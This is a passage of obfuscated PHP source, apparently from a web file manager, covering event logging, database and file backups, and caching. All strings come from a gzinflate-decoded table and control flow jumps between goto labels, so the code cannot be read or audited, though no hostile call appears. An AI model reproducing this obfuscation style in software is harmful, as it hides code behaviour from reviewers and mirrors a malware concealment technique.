$ï¹¥şƒ…[2110] => $íÎëáœ€); } public function authInfo($µáßÄºô) { $»Ê®©ôª =& $_SERVER[•€áå–Õ]; if ($µáßÄºô[$»Ê®©ôª[1995]]) { $º×¿‘»¬ = Model($»Ê®©ôª[551])->listData($µáßÄºô[$»Ê®©ôª[1995]]); if (!$º×¿‘»¬) { return !1; $º—¼’ï¤ = Model($»Ê®©ôª[551])->listData(); $ì©­ÉÉ = array_filter_by_field($º—¼’ï¤, $»Ê®©ôª[466], $»Ê®©ôª[224]); return $ì©­ÉÉ; } $íÅ®¸Ê = array_field_key($º×¿‘»¬, array($»Ê®©ôª[454], $»Ê®©ôª[42], $»Ê®©ôª[466], $»Ê®©ôª[1914], $»Ê®©ôª[1915])); $íÅ®¸Ê[$»Ê®©ôª[2111]] = $µáßÄºô; return $íÅ®¸Ê; } else { return array($»Ê®©ôª[472] => 0, $»Ê®©ôª[1897] => $µáßÄºô[$»Ê®©ôª[2055]], $»Ê®©ôª[473] => $»Ê®©ôª[22], $»Ê®©ôª[1914] => $»Ê®©ôª[2112]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\165\162\x63\x65\x5f\145\166\145\156\x74"; protected $dataAuto = array(array("\143\162\x65\141\x74\145\124\x69\x6d\145", "\x74\x69\x6d\x65", "\x69\x6e\163\x65\x72\164", "\146\165\x6e\x63\164\151\157\x6e"), array("\x64\x65\163\143", '', "\151\156\x73\x65\162\164\54\x75\160\144\x61\x74\x65\x2c\163\145\x6c\x65\x63\164", "\152\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($±¨Ü…¸¡, $œİ€£ù, $Ğ‰ÓìË = '') { $Äú‰Îìè =& $_SERVER[•€áå–Õ]; if (!$this->eventSave) { return; } $Ìì±¿ü‚ = Model($Äú‰Îìè[1374])->sourceInfo($±¨Ü…¸¡); if (!$Ìì±¿ü‚) { return !1; } if ($this->isCacheEvent($Ìì±¿ü‚, $œİ€£ù)) { return; } if ($Ğ‰ÓìË && is_string($Ğ‰ÓìË)) { $Ğ‰ÓìË = array($Äú‰Îìè[1930] => $Ğ‰ÓìË); } $úô¼îÓ¦ = defined($Äú‰Îìè[2113]) ? USER_ID : 0; $ÉàŸ¦˜Ö = array($Äú‰Îìè[470] => $±¨Ü…¸¡, $Äú‰Îìè[2114] => $Ìì±¿ü‚[$Äú‰Îìè[192]], $Äú‰Îìè[2115] => $Ìì±¿ü‚[$Äú‰Îìè[42]], $Äú‰Îìè[562] => !empty($Ìì±¿ü‚[$Äú‰Îìè[562]]) ? $Ìì±¿ü‚[$Äú‰Îìè[562]] : $Äú‰Îìè[22], $Äú‰Îìè[1684] => $úô¼îÓ¦, $Äú‰Îìè[475] => $œİ€£ù, $Äú‰Îìè[1686] => $Ğ‰ÓìË); $this->addSystemLog($œİ€£ù, $ÉàŸ¦˜Ö); unset($ÉàŸ¦˜Ö[$Äú‰Îìè[2115]], $ÉàŸ¦˜Ö[$Äú‰Îìè[562]]); return $this->add($ÉàŸ¦˜Ö); } private function addSystemLog($‹òŒ‚¼û, $”ş¤è™‘) { $º‰¶¾·ô =& $_SERVER[•€áå–Õ]; if ($‹òŒ‚¼û == $º‰¶¾·ô[2116]) { $‹òŒ‚¼û = $”ş¤è™‘[$º‰¶¾·ô[505]][$º‰¶¾·ô[2117]]; } else { if (in_array($‹òŒ‚¼û, array($º‰¶¾·ô[1871], $º‰¶¾·ô[2118]))) { $‹òŒ‚¼û = $”ş¤è™‘[$º‰¶¾·ô[505]][$º‰¶¾·ô[795]]; } } $Ç£òî• = array_merge($”ş¤è™‘, array($º‰¶¾·ô[2119] => $”ş¤è™‘[$º‰¶¾·ô[193]], $º‰¶¾·ô[2120] => $”ş¤è™‘[$º‰¶¾·ô[2120]])); Hook::trigger($º‰¶¾·ô[2121], $º‰¶¾·ô[2122] . $‹òŒ‚¼û, $”ş¤è™‘); Model($º‰¶¾·ô[1835])->addLog($º‰¶¾·ô[2122] . $‹òŒ‚¼û, $Ç£òî•); } private function isCacheEvent($Ï¾²„¾, $÷¸®à´Ø) { if ($Ï¾²„¾[$_SERVER[•€áå–Õ][190]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($ìÖ†‹ŞÕ, $Ü°¾— ´) { $…Èšó© =& $_SERVER[•€áå–Õ]; $ÂØëÊ = Model($…Èšó©[1374])->sourceInfo($ìÖ†‹ŞÕ); $ƒœ‹Ë“ = array($…Èšó©[2117] => $Ü°¾— ´, $…Èšó©[42] => $ÂØëÊ[$…Èšó©[42]]); return $this->addEvent($ìÖ†‹ŞÕ, $…Èšó©[2116], $ƒœ‹Ë“); } public function eventFileEdit($¨Í¬“‘) { $åšõ‘åŒ =& $_SERVER[•€áå–Õ]; $è—¨á” = array($åšõ‘åŒ[2123] => $_SERVER[$åšõ‘åŒ[2124]], $åšõ‘åŒ[2125] => strtolower(ACTION)); if (isset($GLOBALS[$åšõ‘åŒ[17]][$åšõ‘åŒ[2126]])) { $è—¨á”[$åšõ‘åŒ[2126]] = $åšõ‘åŒ[100]; } return $this->addEvent($¨Í¬“‘, $åšõ‘åŒ[1861], $è—¨á”); } public function eventRecycle($ö²¯Â¢’, $¡•Õù«ñ) { return $this->addEvent($ö²¯Â¢’, $_SERVER[•€áå–Õ][2118], $¡•Õù«ñ); } public function eventRemove($ˆ éÄÈ) { $¹¼•ùîê =& $_SERVER[•€áå–Õ]; $Ÿ¾»ÍÅ = Model($¹¼•ùîê[1374])->sourceInfo($ˆ éÄÈ); $ÉÇ–Ôí = $Ÿ¾»ÍÅ[$¹¼•ùîê[42]]; return $this->addEvent($Ÿ¾»ÍÅ[$¹¼•ùîê[192]], $¹¼•ùîê[1860], $ÉÇ–Ôí); } public function eventShare($‘ŞÛşˆ, $Ó›¥µú) { return $this->addEvent($‘ŞÛşˆ, $_SERVER[•€áå–Õ][1871], $Ó›¥µú); } public function eventMove($›Ç÷ëêœ, $€»ºÕç, $®·‘¯¼›) { $İÜÉ¾„ =& $_SERVER[•€áå–Õ]; $†ïßĞØŠ = Model($İÜÉ¾„[1374]); $ü·ê†ò = $†ïßĞØŠ->sourceInfo($›Ç÷ëêœ); $ˆÅ¸şÑ = $†ïßĞØŠ->sourceInfo($€»ºÕç); $ÈàÑ£¥ = $†ïßĞØŠ->sourceInfo($®·‘¯¼›); $ˆû±³óİ = array($İÜÉ¾„[1201] => $€»ºÕç, $İÜÉ¾„[2127] => $ˆÅ¸şÑ[$İÜÉ¾„[42]], $İÜÉ¾„[2104] => !empty($ˆÅ¸şÑ[$İÜÉ¾„[562]]) ? $ˆÅ¸şÑ[$İÜÉ¾„[562]] : $İÜÉ¾„[22], $İÜÉ¾„[1202] => $®·‘¯¼›, $İÜÉ¾„[2128] => $ÈàÑ£¥[$İÜÉ¾„[42]], $İÜÉ¾„[2129] => !empty($ÈàÑ£¥[$İÜÉ¾„[562]]) ? $ÈàÑ£¥[$İÜÉ¾„[562]] : $İÜÉ¾„[22]); $this->addEvent($›Ç÷ëêœ, $İÜÉ¾„[599], $ˆû±³óİ); $ü·ê†ò = $†ïßĞØŠ->sourceInfo($›Ç÷ëêœ); $ˆû±³óİ = array($İÜÉ¾„[193] => $ü·ê†ò[$İÜÉ¾„[193]], $İÜÉ¾„[42] => $ü·ê†ò[$İÜÉ¾„[42]]); $this->addEvent($€»ºÕç, $İÜÉ¾„[2130], $ˆû±³óİ); } public function eventCopy($ç±¦¨ğ²) { $this->eventCreate($ç±¦¨ğ², $_SERVER[•€áå–Õ][597]); } public function eventRename($øŸÒÌŞ˜, $Û…·¤ıñ, $ı¢¢Çà×) { $³–Í´è¡ =& $_SERVER[•€áå–Õ]; $”½¥¶Ì— = array($³–Í´è¡[1201] => $Û…·¤ıñ, $³–Í´è¡[1202] => $ı¢¢Çà×); return $this->addEvent($øŸÒÌŞ˜, $³–Í´è¡[1388], $”½¥¶Ì—); } public function eventAddComment($ã­Š–„ë, $óÈ–¾¨) { return $this->addEvent($ã­Š–„ë, $_SERVER[•€áå–Õ][2131], $óÈ–¾¨); } public function eventAddDesc($Š×ÛÔ¬ó, $ŸÕÖà—) { return $this->addEvent($Š×ÛÔ¬ó, $_SERVER[•€áå–Õ][2132], $ŸÕÖà—); } public function listBySource($áÃ˜ªŒ) { $ªÙ¤šâ =& $_SERVER[•€áå–Õ]; $‹ËƒÇâÚ = Model($ªÙ¤šâ[1374])->sourceInfo($áÃ˜ªŒ); $¹ıËúÖ¥ = array($ªÙ¤šâ[470] => $áÃ˜ªŒ); if ($‹ËƒÇâÚ[$ªÙ¤šâ[464]] == $ªÙ¤šâ[100]) { $ª¶¬¸Øë = Model($ªÙ¤šâ[1374])->listSearchChildren($áÃ˜ªŒ, 20000); $ª¶¬¸Øë[] = $áÃ˜ªŒ . $ªÙ¤šâ[433]; $¹ıËúÖ¥ = array($ªÙ¤šâ[193] => array($ªÙ¤šâ[17], $ª¶¬¸Øë)); } $« Ô™ú = $this->where($¹ıËúÖ¥)->order($ªÙ¤šâ[2133])->selectPage(); if ($« Ô™ú[$ªÙ¤šâ[421]][$ªÙ¤šâ[422]] == 0) { $« Ô™ú[$ªÙ¤šâ[421]][$ªÙ¤šâ[422]] = 1; $« Ô™ú[$ªÙ¤šâ[424]] = array(array($ªÙ¤šâ[470] => $áÃ˜ªŒ, $ªÙ¤šâ[2114] => $‹ËƒÇâÚ[$ªÙ¤šâ[192]], $ªÙ¤šâ[1684] => $‹ËƒÇâÚ[$ªÙ¤šâ[506]], $ªÙ¤šâ[475] => $ªÙ¤šâ[2134], $ªÙ¤šâ[476] => $‹ËƒÇâÚ[$ªÙ¤šâ[227]], $ªÙ¤šâ[1686] => $ªÙ¤šâ[22])); } return $this->eventListParse($« Ô™ú, $áÃ˜ªŒ); } private function eventListParse($¼Éó–¬µ, $úêŠÊ±à) { $Ø˜‰’š =& $_SERVER[•€áå–Õ]; $Î¨¶ô£ = $¼Éó–¬µ[$Ø˜‰’š[424]]; $şÖĞ÷â = array_to_keyvalue($Î¨¶ô£, $Ø˜‰’š[22], $Ø˜‰’š[193]); $òõŸ¾óõ = array_to_keyvalue($Î¨¶ô£, $Ø˜‰’š[22], $Ø˜‰’š[2120]); foreach ($Î¨¶ô£ as $„ˆíìİŒ) { $ıŸÆÉÎ¸ = $„ˆíìİŒ[$Ø˜‰’š[505]]; if ($„ˆíìİŒ[$Ø˜‰’š[43]] == $Ø˜‰’š[599] && isset($ıŸÆÉÎ¸[$Ø˜‰’š[1201]])) { $şÖĞ÷â[] = $ıŸÆÉÎ¸[$Ø˜‰’š[1201]] . $Ø˜‰’š[22]; $şÖĞ÷â[] = $ıŸÆÉÎ¸[$Ø˜‰’š[1202]] . $Ø˜‰’š[22]; } if ($„ˆíìİŒ[$Ø˜‰’š[43]] == $Ø˜‰’š[2130] && isset($ıŸÆÉÎ¸[$Ø˜‰’š[193]])) { $şÖĞ÷â[] = $ıŸÆÉÎ¸[$Ø˜‰’š[193]] . $Ø˜‰’š[22]; } } $şÖĞ÷â = array_merge($şÖĞ÷â, $òõŸ¾óõ, array($úêŠÊ±à . $Ø˜‰’š[22])); $şÖĞ÷â = array_unique($şÖĞ÷â); $ÊÈ®²™µ = array_unique(array_to_keyvalue($Î¨¶ô£, $Ø˜‰’š[22], $Ø˜‰’š[1693])); $×âææÌ = Model($Ø˜‰’š[578])->userListInfo($ÊÈ®²™µ); $ÓÓñĞË³ = Model($Ø˜‰’š[866])->sourceListInfo($şÖĞ÷â, !0); foreach ($Î¨¶ô£ as &$„ˆíìİŒ) { if ($„ˆíìİŒ[$Ø˜‰’š[43]] == $Ø˜‰’š[599] && isset($„ˆíìİŒ[$Ø˜‰’š[505]][$Ø˜‰’š[1201]])) { $„ˆíìİŒ[$Ø˜‰’š[505]][$Ø˜‰’š[1201]] = $ÓÓñĞË³[$„ˆíìİŒ[$Ø˜‰’š[505]][$Ø˜‰’š[1201]]]; $„ˆíìİŒ[$Ø˜‰’š[505]][$Ø˜‰’š[1202]] = $ÓÓñĞË³[$„ˆíìİŒ[$Ø˜‰’š[505]][$Ø˜‰’š[1202]]]; } if ($„ˆíìİŒ[$Ø˜‰’š[43]] == $Ø˜‰’š[2130] && isset($„ˆíìİŒ[$Ø˜‰’š[505]][$Ø˜‰’š[193]])) { $„ˆíìİŒ[$Ø˜‰’š[505]][$Ø˜‰’š[193]] = $ÓÓñĞË³[$„ˆíìİŒ[$Ø˜‰’š[505]][$Ø˜‰’š[193]]]; } $„ˆíìİŒ[$Ø˜‰’š[99]] = $ÓÓñĞË³[$„ˆíìİŒ[$Ø˜‰’š[193]]]; $„ˆíìİŒ[$Ø˜‰’š[2135]] = $ÓÓñĞË³[$„ˆíìİŒ[$Ø˜‰’š[2120]]]; if ($„ˆíìİŒ[$Ø˜‰’š[43]] == $Ø˜‰’š[1860]) { $„ˆíìİŒ[$Ø˜‰’š[2135]] = $„ˆíìİŒ[$Ø˜‰’š[99]]; $„ˆíìİŒ[$Ø˜‰’š[2120]] = $„ˆíìİŒ[$Ø˜‰’š[2135]][$Ø˜‰’š[193]]; $„ˆíìİŒ[$Ø˜‰’š[99]] = !1; $„ˆíìİŒ[$Ø˜‰’š[193]] = $Ø˜‰’š[22]; } $„ˆíìİŒ[$Ø˜‰’š[2063]] = $×âææÌ[$„ˆíìİŒ[$Ø˜‰’š[1693]]]; } unset($„ˆíìİŒ); $¼Éó–¬µ[$Ø˜‰’š[424]] = $Î¨¶ô£; return $¼Éó–¬µ; } public function removeBySource($¸¯È¸¸ã) { $²õºİıµ = array($_SERVER[•€áå–Õ][470] => $¸¯È¸¸ã); $this->where($²õºİıµ)->remove(); } } goto B¤¼’…¹†¬; EÕ¨„³ÜÑñ: class BackupDbFile { public function __construct() { } public function index() { $âËö­Ë£ =& $_SERVER[•€áå–Õ]; $’ßÌÎ££ = Backup::get(); $Ğéû¼¤¨ = $’ßÌÎ££[$âËö­Ë£[42]]; $Çş¸ššâ = $this->tmpFilesPath() . "\x62\x61\143\x6b\165\x70\137{$Ğéû¼¤¨}\x2f"; $ËÍ‰Ôà = $this->backupPath($’ßÌÎ££); if (!($ËÍ‰Ôà = IO::mkdir($ËÍ‰Ôà))) { return !1; } $Í©é´“Ÿ = IO::listPath($Çş¸ššâ); $ªåüö«é = isset($Í©é´“Ÿ[$âËö­Ë£[95]]) ? $Í©é´“Ÿ[$âËö­Ë£[95]] : array(); $¹åÂ”õÁ = array_sum(array_column($ªåüö«é, $âËö­Ë£[88])); if (!$¹åÂ”õÁ) { return !1; } $‰ò­º–Ì = array($âËö­Ë£[839] => $¹åÂ”õÁ, $âËö­Ë£[840] => time()); Backup::set($‰ò­º–Ì); $¦ŞË™šÜ = new TaskFileTransfer($âËö­Ë£[841], $âËö­Ë£[821], count($ªåüö«é), LNG($âËö­Ë£[822]) . $âËö­Ë£[441] . LNG($âËö­Ë£[824]) . $âËö­Ë£[842]); $¦ŞË™šÜ->task[$âËö­Ë£[804]] = $¹åÂ”õÁ; foreach ($Í©é´“Ÿ[$âËö­Ë£[95]] as $âşíÈêÊ) { $˜¯‚ÁğÃ = IO::move($âşíÈêÊ[$âËö­Ë£[96]], $ËÍ‰Ôà); if (!$˜¯‚ÁğÃ) { $¦ŞË™šÜ->end(); $·İ½õúˆ = IO::getLastError($âËö­Ë£[843] . $âşíÈêÊ[$âËö­Ë£[96]] . $âËö­Ë£[844] . $ËÍ‰Ôà . $âËö­Ë£[177]); write_log($·İ½õúˆ, $âËö­Ë£[821]); return !1; } } $ÛÜ“®¢ä = new DbManage(); $ñí©õì = $ÛÜ“®¢ä->getSqlFile(); if (!$ñí©õì[$âËö­Ë£[845]] || !$ñí©õì[$âËö­Ë£[23]]) { return !1; } IO::move($ñí©õì[$âËö­Ë£[845]], $ËÍ‰Ôà); IO::move($ñí©õì[$âËö­Ë£[23]], $ËÍ‰Ôà); $¦ŞË™šÜ->end(); $‰ò­º–Ì = array($âËö­Ë£[846] => $¹åÂ”õÁ, $âËö­Ë£[847] => time()); Backup::set($‰ò­º–Ì); return !0; } private function backupPath($òşœ‡˜æ) { $ÉôøäØ¹ =& $_SERVER[•€áå–Õ]; $Äê¯ığ = $òşœ‡˜æ[$ÉôøäØ¹[42]]; $‘‡Ï¬Š = Model($ÉôøäØ¹[811])->get($ÉôøäØ¹[812]); $ø¶éÕã = substr(md5($ÉôøäØ¹[813] . $‘‡Ï¬Š . $Äê¯ığ), 0, 8); return "\x7b\151\x6f\72{$òşœ‡˜æ[$ÉôøäØ¹[792]]}\175\57\144\141\x74\x61\x62\141\163\x65\x2f\142\x61\x63\153\x75\160\x2f" . $Äê¯ığ . $ÉôøäØ¹[21] . $ø¶éÕã; } private function tmpFilesPath() { $áñÏÙœş =& $_SERVER[•€áå–Õ]; $í³¦ş¹‘ = TEMP_FILES; if ($GLOBALS[$áñÏÙœş[16]][$áñÏÙœş[101]][$áñÏÙœş[837]]) { $í³¦ş¹‘ = $GLOBALS[$áñÏÙœş[16]][$áñÏÙœş[101]][$áñÏÙœş[837]]; if (!mk_dir($í³¦ş¹‘) || !is_writable($í³¦ş¹‘) || !IO::mkfile($í³¦ş¹‘ . $áñÏÙœş[838])) { $í³¦ş¹‘ = TEMP_FILES; } } return $í³¦ş¹‘; } } class BackupFile { public function __construct() { } public function index() { $½»Öê—« = Backup::get(); $™ÓŠòàÊ = $½»Öê—«[$_SERVER[•€áå–Õ][348]][$_SERVER[•€áå–Õ][226]][$_SERVER[•€áå–Õ][520]]; $†˜ì•Ôö = array($_SERVER[•€áå–Õ][521] => array($_SERVER[•€áå–Õ][848], $™ÓŠòàÊ), $_SERVER[•€áå–Õ][849] => array($_SERVER[•€áå–Õ][386], $½»Öê—«[$_SERVER[•€áå–Õ][792]])); $•üô×² = (int) Model($_SERVER[•€áå–Õ][830])->where($†˜ì•Ôö)->count($_SERVER[•€áå–Õ][520]); $ÁÏõŒÍà = (int) Model($_SERVER[•€áå–Õ][830])->where($†˜ì•Ôö)->sum($_SERVER[•€áå–Õ][88]); $ë—¡˜£† = new TaskFileTransfer($_SERVER[•€áå–Õ][850], $_SERVER[•€áå–Õ][821], $•üô×², LNG($_SERVER[•€áå–Õ][822]) . $_SERVER[•€áå–Õ][823] . LNG($_SERVER[•€áå–Õ][851])); $ë—¡˜£†->task[$_SERVER[•€áå–Õ][804]] = $ÁÏõŒÍà; $³´óŞµÏ = array($_SERVER[•€áå–Õ][852] => $•üô×², $_SERVER[•€áå–Õ][853] => $ÁÏõŒÍà, $_SERVER[•€áå–Õ][854] => time()); Backup::set($³´óŞµÏ); $àÈàµê = !0; $¶—ÖŞ¬Ä = $this->storeIds(); $‡éõ‰†… = 1; $‘Œ©ô·™ = 1000; $ÄÒš…éÂ = $õÒ£¶ôª = 0; $îË”İÃ = array(); $÷ı¿€ŸÇ = $Êêøš’Ç = 0; do { $•àå õ = $_SERVER[•€áå–Õ][855]; $âÕ¾©Ä = Model($_SERVER[•€áå–Õ][830])->where($†˜ì•Ôö)->field($•àå õ)->order($_SERVER[•€áå–Õ][856])->selectPage($‘Œ©ô·™, $‡éõ‰†…); $ïÈƒñ– = !empty($âÕ¾©Ä[$_SERVER[•€áå–Õ][424]]) ? $âÕ¾©Ä[$_SERVER[•€áå–Õ][424]] : array(); foreach ($ïÈƒñ– as $ãÍ÷¿Ââ) { if (!$this->_fileExist($ãÍ÷¿Ââ, $îË”İÃ, $¶—ÖŞ¬Ä)) { $•üô×² -= 1; $ÁÏõŒÍà -= (int) $ãÍ÷¿Ââ[$_SERVER[•€áå–Õ][88]]; write_log("\x66\151\154\x65\40\x6e\x6f\164\40\x65\x78\151\163\164\x2e\x66\x69\154\x65\111\104\72{$ãÍ÷¿Ââ[$_SERVER[•€áå–Õ][520]]}\54\40\x70\141\164\x68\x3a{$ãÍ÷¿Ââ[$_SERVER[•€áå–Õ][96]]}", $_SERVER[•€áå–Õ][857]); continue; } $ı€†½Æ = $ãÍ÷¿Ââ[$_SERVER[•€áå–Õ][96]]; $©İ…ÖĞ = "\173\x69\157\x3a{$½»Öê—«[$_SERVER[•€áå–Õ][792]]}\x7d" . substr($ı€†½Æ, strlen("\173\x69\x6f\x3a{$ãÍ÷¿Ââ[$_SERVER[•€áå–Õ][858]]}\x7d")); if (IO::exist($©İ…ÖĞ)) { $ë—¡˜£†->updateFileEnd($ãÍ÷¿Ââ[$_SERVER[•€áå–Õ][42]], $ãÍ÷¿Ââ[$_SERVER[•€áå–Õ][88]]); } else { $©İ…ÖĞ = get_path_father($©İ…ÖĞ); IO::mkdir($©İ…ÖĞ); if (!IO::copy($ı€†½Æ, $©İ…ÖĞ, $_SERVER[•€áå–Õ][859])) { write_log($_SERVER[•€áå–Õ][860] . $ı€†½Æ . $_SERVER[•€áå–Õ][844] . $©İ…ÖĞ . $_SERVER[•€áå–Õ][177], $_SERVER[•€áå–Õ][821]); $àÈàµê = !1; break; } } $™ÓŠòàÊ = $ãÍ÷¿Ââ[$_SERVER[•€áå–Õ][520]]; $õÒ£¶ôª += 1; $ÄÒš…éÂ += $ãÍ÷¿Ââ[$_SERVER[•€áå–Õ][88]]; $Êêøš’Ç += 1; $÷ı¿€ŸÇ += $ãÍ÷¿Ââ[$_SERVER[•€áå–Õ][88]]; if ($ÄÒš…éÂ >= 1024 * 1024 * 100) { $³´óŞµÏ = array($_SERVER[•€áå–Õ][861] => $™ÓŠòàÊ, $_SERVER[•€áå–Õ][862] => $Êêøš’Ç, $_SERVER[•€áå–Õ][863] => $÷ı¿€ŸÇ); Backup::set($³´óŞµÏ); $ÄÒš…éÂ = $õÒ£¶ôª = 0; } } $ Çİûé = count($ïÈƒñ–); $‡éõ‰†…++; } while ($ Çİûé == $‘Œ©ô·™); $ë—¡˜£†->end(); $³´óŞµÏ = array($_SERVER[•€áå–Õ][864] => 1, $_SERVER[•€áå–Õ][802] => time(), $_SERVER[•€áå–Õ][816] => 1, $_SERVER[•€áå–Õ][861] => $™ÓŠòàÊ, $_SERVER[•€áå–Õ][853] => $ÁÏõŒÍà, $_SERVER[•€áå–Õ][852] => $•üô×², $_SERVER[•€áå–Õ][865] => time()); if ($õÒ£¶ôª) { $³´óŞµÏ[$_SERVER[•€áå–Õ][862]] = $Êêøš’Ç; $³´óŞµÏ[$_SERVER[•€áå–Õ][863]] = $÷ı¿€ŸÇ; } Backup::set($³´óŞµÏ); $this->_fileFilter($îË”İÃ); return !0; } private function _fileExist($ş›ïâÆò, &$ßß¶ó§Ó, $Ô„éØù³) { $ÌÊò»ó =& $_SERVER[•€áå–Õ]; $”¨à¿öù = $ş›ïâÆò[$ÌÊò»ó[96]]; if (in_array($ş›ïâÆò[$ÌÊò»ó[520]], $ßß¶ó§Ó)) { return !1; } if (!in_array($ş›ïâÆò[$ÌÊò»ó[858]], $Ô„éØù³)) { return !1; } if (IO::exist($”¨à¿öù)) { return !0; } $‡–æîÛ« = get_path_father($”¨à¿öù); if (IO::exist($‡–æîÛ«)) { $ßß¶ó§Ó[] = $ş›ïâÆò[$ÌÊò»ó[520]]; return !1; } $°ÄÚ±Ù¿ = array($ÌÊò»ó[858] => $ş›ïâÆò[$ÌÊò»ó[858]], $ÌÊò»ó[96] => array($ÌÊò»ó[438], "{$‡–æîÛ«}\x25")); $ÅƒêÙ´ = Model($ÌÊò»ó[830])->where($°ÄÚ±Ù¿)->field($ÌÊò»ó[521])->select(); $ßß¶ó§Ó = array_merge($ßß¶ó§Ó, array_to_keyvalue($ÅƒêÙ´, $ÌÊò»ó[22], $ÌÊò»ó[520])); return !1; } private function _fileFilter($æÀÚ×øƒ) { $Ñ•ÔÏ°Â =& $_SERVER[•€áå–Õ]; if (empty($æÀÚ×øƒ)) { return; } $©†‚šÎÛ = array($Ñ•ÔÏ°Â[520] => array($Ñ•ÔÏ°Â[17], array_unique($æÀÚ×øƒ))); $«·æ´–½ = Model($Ñ•ÔÏ°Â[866])->where($©†‚šÎÛ)->field($Ñ•ÔÏ°Â[193])->select(); foreach ($«·æ´–½ as $¦ø“´öŞ) { Model($Ñ•ÔÏ°Â[866])->remove($¦ø“´öŞ[$Ñ•ÔÏ°Â[193]], !1); } } private function storeIds() { $„ƒÀ×ÌÚ =& $_SERVER[•€áå–Õ]; $ë¹…ò © = Model($„ƒÀ×ÌÚ[808])->listData(); $îÃ­Ö° = array(); $õ—ˆó = $GLOBALS[$„ƒÀ×ÌÚ[16]][$„ƒÀ×ÌÚ[101]][$„ƒÀ×ÌÚ[867]]; foreach ($ë¹…ò © as $¾ïÏ³Öé) { $ùï•ä¹Å = strtolower($¾ïÏ³Öé[$„ƒÀ×ÌÚ[107]]); if (!isset($õ—ˆó[$ùï•ä¹Å])) { continue; } $œ‰Èéâ = $„ƒÀ×ÌÚ[86] . (isset($õ—ˆó[$ùï•ä¹Å]) ? $õ—ˆó[$ùï•ä¹Å] : ucfirst($ùï•ä¹Å)); if (!class_exists($œ‰Èéâ)) { continue; } $îÃ­Ö°[] = $¾ïÏ³Öé[$„ƒÀ×ÌÚ[454]]; } return $îÃ­Ö°; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ãìëæâò =& $_SERVER[•€áå–Õ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $¸²†ÃÛË = $GLOBALS[$ãìëæâò[16]][$ãìëæâò[404]]; $ı×¨à˜Ç = $¸²†ÃÛË[$¸²†ÃÛË[$ãìëæâò[868]]]; $¶«½³™’ = $¸²†ÃÛË[$ãìëæâò[869]]; switch ($¸²†ÃÛË[$ãìëæâò[868]]) { case $ãìëæâò[31]: self::$handle = Model($ãìëæâò[870]); break; case $ãìëæâò[871]: self::$handle = new CacheRedis($ı×¨à˜Ç, $¶«½³™’); break; case $ãìëæâò[872]: self::$handle = new CacheMemcached($ı×¨à˜Ç, $¶«½³™’); break; case $ãìëæâò[226]: self::$handle = new CacheFile($ı×¨à˜Ç, $¶«½³™’); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($²èå“Ö›) { if (is_array($²èå“Ö›) || is_object($²èå“Ö›)) { $²èå“Ö› = json_encode($²èå“Ö›); } $²èå“Ö› = rawurlencode($²èå“Ö›); return md5(KOD_SITE_ID . $_SERVER[•€áå–Õ][21] . $²èå“Ö›); } public static function get($šØ«—ÀË, $Ÿ–§«Ÿ‹ = false) { $“£¥¼ùŠ = self::key($šØ«—ÀË); $šº½ÈÖ = self::init(); if ($Ÿ–§«Ÿ‹) { return unserialize($šº½ÈÖ->get($“£¥¼ùŠ)); } if (!isset(self::$memoryCache[$“£¥¼ùŠ])) { $ŸúƒÅ’ = $šº½ÈÖ->get($“£¥¼ùŠ); self::$memoryCache[$“£¥¼ùŠ] = unserialize($ŸúƒÅ’); } return self::$memoryCache[$“£¥¼ùŠ]; } public static function set($ûÒ¨¬, $”î’¤ùş, $®¡È¶Î¥ = false) { $±ãØ ‚  =& $_SERVER[•€áå–Õ]; $ÀÌÙÂ©¦ = self::key($ûÒ¨¬); if (isset(self::$memoryCache[$ÀÌÙÂ©¦]) && self::$memoryCache[$ÀÌÙÂ©¦] === $”î’¤ùş) { return !0; } if ($®¡È¶Î¥ === 0) { self::$memoryCache[$ÀÌÙÂ©¦] = $”î’¤ùş; return !0; } $×ûâôÂ³ = self::init(); $´µ…²Õ = serialize($”î’¤ùş); CacheLock::lock($ûÒ¨¬ . $±ãØ ‚ [873]); $şôíŒÄí = $×ûâôÂ³->set($ÀÌÙÂ©¦, $´µ…²Õ, $®¡È¶Î¥); self::$memoryCache[$ÀÌÙÂ©¦] = $”î’¤ùş; CacheLock::unlock($ûÒ¨¬ . $±ãØ ‚ [873]); return $şôíŒÄí; } public static function getCall($Á½½æ£è, $ï±®ıï, $±ÅÔ·°, $µâ‘Úœ = array()) { $ÔøÎ Ÿ =& $_SERVER[•€áå–Õ]; $ıÜÍ è = self::get($Á½½æ£è); if ($ıÜÍ è || $ıÜÍ è === $ÔøÎ Ÿ[22]) { return $ıÜÍ è; } $ıÜÍ è = call_user_func_array($±ÅÔ·°, $µâ‘Úœ); $ıÜÍ è = $ıÜÍ è ? $ıÜÍ è : $ÔøÎ Ÿ[22]; self::set($Á½½æ£è, $ıÜÍ è, $ï±®ıï); return $ıÜÍ è; } public static function remove($ÅİÂ¯´á) { $ö¸Óİ¨• = self::key($ÅİÂ¯´á); unset(self::$memoryCache[$ö¸Óİ¨•]); self::clearTimeout(); CacheLock::lock($ÅİÂ¯´á); $éå†®‹Ÿ = self::init()->remove($ö¸Óİ¨•); CacheLock::unlock($ÅİÂ¯´á); return $éå†®‹Ÿ; } public static function removeMemory($€çøÉĞé) { $ëƒÓ”¡² = self::key($€çøÉĞé); unset(self::$memoryCache[$ëƒÓ”¡²]); } public static function clearMemory($³›¶Åè‚ = false) { if ($³›¶Åè‚) { $³›¶Åè‚ = self::key($³›¶Åè‚); unset(self::$memoryCache[$³›¶Åè‚]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[•€áå–Õ][874])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[•€áå–Õ][875])) { self::init()->clearTimeout(); } } } goto E…à¬Àò÷ß; E¸©½­´½: define($_SERVER[•€áå–Õ][0], $_SERVER[•€áå–Õ][1]); $_SERVER[´Ûòªšˆ] = explode($_SERVER[•€áå–Õ][2], gzinflate(substr($_SERVER[•€áå–Õ][3], 10, -8))); function binCheckEq($İªü‘ÚÚ, $¤á–ß‰ ) { return $İªü‘ÚÚ == $¤á–ß‰ ; } goto e İ¬±ÑÈ; dİ½ëâäôÆ: class 